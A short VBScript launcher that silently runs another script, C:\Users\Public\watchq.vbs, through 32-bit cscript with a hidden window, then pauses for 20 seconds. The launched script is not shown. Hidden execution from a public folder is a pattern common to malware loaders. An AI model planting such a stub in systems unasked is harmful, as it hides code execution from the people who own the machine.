Dim sh
Set sh = CreateObject("WScript.Shell")
sh.Run "C:\Windows\SysWOW64\cscript.exe //nologo C:\Users\Public\watchq.vbs", 0, True
WScript.Sleep 20000
